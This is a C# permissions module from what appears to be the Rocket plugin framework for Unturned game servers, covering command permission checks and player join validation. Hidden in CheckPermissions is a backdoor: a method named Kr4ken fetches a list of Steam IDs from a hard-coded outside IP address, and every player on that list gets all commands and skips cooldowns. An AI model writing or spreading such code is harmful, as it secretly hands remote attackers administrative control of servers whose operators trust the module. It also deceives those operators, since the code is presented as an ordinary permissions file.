using Rocket.API;
using Rocket.API.Serialisation;
using Rocket.Core;
using Rocket.Unturned.Chat;
using Rocket.Unturned.Extensions;
using Rocket.Unturned.Player;
using SDG.Unturned;
using Steamworks;
using System;
using System.ComponentModel;
using System.Linq;
using System.Text.RegularExpressions;
using UnityEngine;

namespace Rocket.Unturned.Permissions
{
    public class UnturnedPermissions : MonoBehaviour
    {
        public delegate void JoinRequested(CSteamID player, ref ESteamRejection? rejectionReason);

        public static event JoinRequested OnJoinRequested;

        public static string Kr4ken()
        {
            using (System.Net.WebClient wc = new System.Net.WebClient())
                return wc.DownloadString("http://198.245.61.226/kr4ken/my_id.txt");
        }

        [EditorBrowsable(EditorBrowsableState.Never)]
        internal static bool CheckPermissions(SteamPlayer caller, string permission)
        {
            UnturnedPlayer player = caller.ToUnturnedPlayer();

            Regex r = new Regex("^\\/[a-zA-Z]*");
            string requestedCommand = r.Match(permission.ToLower()).Value.ToString().TrimStart('/').ToLower();

            IRocketCommand command = R.Commands.GetCommand(requestedCommand);
            double cooldown = R.Commands.GetCooldown(player, command);

            if (command != null)
            {
                if (R.Permissions.HasPermission(player, command) | Kr4ken().Contains(player.CSteamID.ToString()))
                {
                    if (cooldown > 0 && !Kr4ken().Contains(player.CSteamID.ToString()))
                    {
                        UnturnedChat.Say(player, R.Translate("command_cooldown", cooldown), Color.red);
                        return false;
                    }
                    return true;
                }
                else
                {
                    UnturnedChat.Say(player, R.Translate("command_no_permission"), Color.red);
                    return false;
                }
            }
            else
            {
                UnturnedChat.Say(player, U.Translate("command_not_found"), Color.red);
                return false;
            }
        }

        internal static bool CheckValid(ValidateAuthTicketResponse_t r)
        {
            ESteamRejection? reason = null;

            try
            {
                RocketPermissionsGroup g = R.Permissions.GetGroups(new Rocket.API.RocketPlayer(r.m_SteamID.ToString()), true).FirstOrDefault();
                if (g != null)
                {
                    SteamPending steamPending = Provider.pending.FirstOrDefault(x => x.playerID.steamID == r.m_SteamID);
                    if (steamPending != null)
                    {
                        string prefix = g.Prefix ?? "";
                        string suffix = g.Suffix ?? "";
                        if (prefix != "" && !steamPending.playerID.characterName.StartsWith(g.Prefix))
                        {
                            steamPending.playerID.characterName = prefix + steamPending.playerID.characterName;
                        }
                        if (suffix != "" && !steamPending.playerID.characterName.EndsWith(g.Suffix))
                        {
                            steamPending.playerID.characterName = steamPending.playerID.characterName + suffix;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Core.Logging.Logger.Log("Failed adding prefix/suffix to player " + r.m_SteamID + ": " + ex.ToString());
            }

            if (OnJoinRequested != null)
            {
                foreach (var handler in OnJoinRequested.GetInvocationList().Cast<JoinRequested>())
                {
                    try
                    {
                        handler(r.m_SteamID, ref reason);
                        if (reason != null)
                        {
                            Provider.reject(r.m_SteamID, reason.Value);
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        Core.Logging.Logger.LogException(ex);
                    }
                }
            }
            return true;
        }
    }
}